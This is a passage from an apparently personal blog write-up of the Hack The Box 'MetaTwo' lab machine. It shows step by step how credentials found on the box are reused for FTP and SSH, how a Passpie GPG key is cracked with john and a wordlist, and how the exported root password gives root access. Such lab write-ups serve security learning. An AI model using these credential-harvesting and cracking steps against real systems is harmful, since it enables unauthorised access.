</span></span><span style=display:flex><span>        define( <span style=color:#0086d2>&#39;ABSPATH&#39;</span>, <span style=color:#0086d2>__DIR__</span> . <span style=color:#0086d2>&#39;/&#39;</span> );
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** Sets up WordPress vars and included files. */</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>require_once</span> ABSPATH . <span style=color:#0086d2>&#39;wp-settings.php&#39;</span>;
</span></span></code></pre></div><p>We have FTP and MYSQL credentials &#x1f604;</p><p>Trying FTP access:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/p8/metatwo» ftp metapress.htb@metapress.htb
</span></span><span style=display:flex><span>Connected to metapress.htb.
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>220</span> ProFTPD Server (Debian) [::ffff:10.129.36.200]
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>331</span> Password required <span style=color:#fb660a;font-weight:700>for</span> metapress.htb
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>230</span> User metapress.htb logged in
</span></span><span style=display:flex><span>Remote system type is UNIX.
</span></span><span style=display:flex><span>Using binary mode to transfer files.
</span></span><span style=display:flex><span>ftp&gt; dir
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>200</span> PORT command successful
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>150</span> Opening ASCII mode data connection <span style=color:#fb660a;font-weight:700>for</span> file list
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#0086f7;font-weight:700>5</span> metapress.htb metapress.htb     <span style=color:#0086f7;font-weight:700>4096</span> Oct  <span style=color:#0086f7;font-weight:700>5</span> 14:12 blog
</span></span><span style=display:flex><span>drwxr-xr-x   <span style=color:#0086f7;font-weight:700>3</span> metapress.htb metapress.htb     <span style=color:#0086f7;font-weight:700>4096</span> Oct  <span style=color:#0086f7;font-weight:700>5</span> 14:12 mailer
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ftp&gt; cd mailer
</span></span><span style=display:flex><span>ftp&gt; get send_email.php
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>200</span> PORT command successful
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>150</span> Opening BINARY mode data connection <span style=color:#fb660a;font-weight:700>for</span> send_email.php (<span style=color:#0086f7;font-weight:700>1126</span> bytes)
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>226</span> Transfer complete
</span></span><span style=display:flex><span><span style=color:#0086f7;font-weight:700>1126</span> bytes received in 5,8e-05 seconds (18,5 Mbytes/s)
</span></span></code></pre></div><p>This send_email.php</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>/*
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic> * This script will be used to send an email to all our users when ready for launch
</span></span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>*/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>use</span> PHPMailer\PHPMailer\PHPMailer;
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>use</span> PHPMailer\PHPMailer\SMTP;
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>use</span> PHPMailer\PHPMailer\Exception;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>require</span> <span style=color:#0086d2>&#39;PHPMailer/src/Exception.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>require</span> <span style=color:#0086d2>&#39;PHPMailer/src/PHPMailer.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>require</span> <span style=color:#0086d2>&#39;PHPMailer/src/SMTP.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span> = <span style=color:#fb660a;font-weight:700>new</span> PHPMailer(<span style=color:#fb660a;font-weight:700>true</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>SMTPDebug</span> = <span style=color:#0086f7;font-weight:700>3</span>;                               
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>isSMTP</span>();            
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>Host</span> = <span style=color:#0086d2>&#34;mail.metapress.htb&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>SMTPAuth</span> = <span style=color:#fb660a;font-weight:700>true</span>;                          
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>Username</span> = <span style=color:#0086d2>&#34;jnelson@metapress.htb&#34;</span>;                 
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>Password</span> = <span style=color:#0086d2>&#34;Cb4_JmWM8zUZWMu@Ys&#34;</span>;                           
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>SMTPSecure</span> = <span style=color:#0086d2>&#34;tls&#34;</span>;                           
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>Port</span> = <span style=color:#0086f7;font-weight:700>587</span>;                                   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>From</span> = <span style=color:#0086d2>&#34;jnelson@metapress.htb&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>FromName</span> = <span style=color:#0086d2>&#34;James Nelson&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>addAddress</span>(<span style=color:#0086d2>&#34;info@metapress.htb&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>isHTML</span>(<span style=color:#fb660a;font-weight:700>true</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>Subject</span> = <span style=color:#0086d2>&#34;Startup&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>Body</span> = <span style=color:#0086d2>&#34;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>send</span>();
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>echo</span> <span style=color:#0086d2>&#34;Message has been sent successfully&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#fb660a;font-weight:700>catch</span> (Exception <span style=color:#fb660a>$e</span>) {
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>echo</span> <span style=color:#0086d2>&#34;Mailer Error: &#34;</span> . <span style=color:#fb660a>$mail</span>-&gt;<span style=color:#ff0086;font-weight:700>ErrorInfo</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Turns out those Mail SMTPAuth credentials works for SSH:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jnelson@meta2:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(jnelson) <span style=color:#fb660a>gid</span>=1000(jnelson) <span style=color:#fb660a>groups</span>=1000(jnelson)
</span></span></code></pre></div><h2 id=getting-root-flag>Getting root flag
<a class=heading-link href=#getting-root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Reviewing local dir:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jnelson@meta2:~$ ls -ltra
</span></span><span style=display:flex><span>total <span style=color:#0086f7;font-weight:700>32</span>
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> jnelson jnelson  <span style=color:#0086f7;font-weight:700>807</span> Jun <span style=color:#0086f7;font-weight:700>26</span> 15:46 .profile
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> jnelson jnelson <span style=color:#0086f7;font-weight:700>3526</span> Jun <span style=color:#0086f7;font-weight:700>26</span> 15:46 .bashrc
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> jnelson jnelson  <span style=color:#0086f7;font-weight:700>220</span> Jun <span style=color:#0086f7;font-weight:700>26</span> 15:46 .bash_logout
</span></span><span style=display:flex><span>lrwxrwxrwx <span style=color:#0086f7;font-weight:700>1</span> root    root       <span style=color:#0086f7;font-weight:700>9</span> Jun <span style=color:#0086f7;font-weight:700>26</span> 15:59 .bash_history -&gt; /dev/null
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#0086f7;font-weight:700>3</span> root    root    <span style=color:#0086f7;font-weight:700>4096</span> Oct  <span style=color:#0086f7;font-weight:700>5</span> 15:12 ..
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#0086f7;font-weight:700>3</span> jnelson jnelson <span style=color:#0086f7;font-weight:700>4096</span> Oct <span style=color:#0086f7;font-weight:700>25</span> 12:51 .local
</span></span><span style=display:flex><span>dr-xr-x--- <span style=color:#0086f7;font-weight:700>3</span> jnelson jnelson <span style=color:#0086f7;font-weight:700>4096</span> Oct <span style=color:#0086f7;font-weight:700>25</span> 12:52 .passpie
</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#0086f7;font-weight:700>4</span> jnelson jnelson <span style=color:#0086f7;font-weight:700>4096</span> Oct <span style=color:#0086f7;font-weight:700>25</span> 12:53 .
</span></span><span style=display:flex><span>-rw-r----- <span style=color:#0086f7;font-weight:700>1</span> jnelson jnelson   <span style=color:#0086f7;font-weight:700>33</span> Nov <span style=color:#0086f7;font-weight:700>30</span> 01:21 user.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jnelson@meta2:~/.passpie/ssh$ cat root.pass
</span></span><span style=display:flex><span>comment: <span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>fullname: root@ssh
</span></span><span style=display:flex><span>login: root
</span></span><span style=display:flex><span>modified: 2022-06-26 08:58:15.621572
</span></span><span style=display:flex><span>name: ssh
</span></span><span style=display:flex><span>password: <span style=color:#0086d2>&#39;-----BEGIN PGP MESSAGE-----
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  lpF0RatbxQGWBks5F3o=
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  =uh1B
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  -----END PGP MESSAGE-----
</span></span></span><span style=display:flex><span><span style=color:#0086d2>
</span></span></span><span style=display:flex><span><span style=color:#0086d2>  &#39;</span>
</span></span></code></pre></div><p>Passpie is a password manager, I need to crack the .keys first:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jnelson@meta2:~$ ls -ltra .passpie/.keys
</span></span><span style=display:flex><span>-r-xr-x--- <span style=color:#0086f7;font-weight:700>1</span> jnelson jnelson <span style=color:#0086f7;font-weight:700>5243</span> Jun <span style=color:#0086f7;font-weight:700>26</span> 13:58 .passpie/.keys
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>» gpg2john keys &gt; gpg.john
</span></span><span style=display:flex><span>File keys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>» john -w=/usr/share/dict/rockyou.txt gpg.john
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>blink182         (Passpie)
</span></span></code></pre></div><p>Now we have the passphrase.</p><p>These are the existing passwords stored:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jnelson@meta2:~$ passpie list
</span></span><span style=display:flex><span>╒════════╤═════════╤════════════╤═══════════╕
</span></span><span style=display:flex><span>│ Name   │ Login   │ Password   │ Comment   │
</span></span><span style=display:flex><span>╞════════╪═════════╪════════════╪═══════════╡
</span></span><span style=display:flex><span>│ ssh    │ jnelson │ ********   │           │
</span></span><span style=display:flex><span>├────────┼─────────┼────────────┼───────────┤
</span></span><span style=display:flex><span>│ ssh    │ root    │ ********   │           │
</span></span><span style=display:flex><span>╘════════╧═════════╧════════════╧═══════════╛
</span></span></code></pre></div><p>Exporting and reviewing:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jnelson@meta2:~$ passpie export exported
</span></span><span style=display:flex><span>Passphrase:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>jnelson@meta2:~$ cat exported
</span></span><span style=display:flex><span>credentials:
</span></span><span style=display:flex><span>- comment: <span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>  fullname: root@ssh
</span></span><span style=display:flex><span>  login: root
</span></span><span style=display:flex><span>  modified: 2022-06-26 08:58:15.621572
</span></span><span style=display:flex><span>  name: ssh
</span></span><span style=display:flex><span>  password: !!python/unicode <span style=color:#0086d2>&#39;p7qfAZt4_A1xo_0x&#39;</span>
</span></span><span style=display:flex><span>- comment: <span style=color:#0086d2>&#39;&#39;</span>
</span></span><span style=display:flex><span>  fullname: jnelson@ssh
</span></span><span style=display:flex><span>  login: jnelson
</span></span><span style=display:flex><span>  modified: 2022-06-26 08:58:15.514422
</span></span><span style=display:flex><span>  name: ssh
</span></span><span style=display:flex><span>  password: !!python/unicode <span style=color:#0086d2>&#39;Cb4_JmWM8zUZWMu@Ys&#39;</span>
</span></span><span style=display:flex><span>handler: passpie
</span></span><span style=display:flex><span>version: 1.0
</span></span></code></pre></div><p>And then:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>jnelson@meta2:~$ su root
</span></span><span style=display:flex><span>Password:
</span></span><span style=display:flex><span>root@meta2:/home/jnelson# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root)
</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>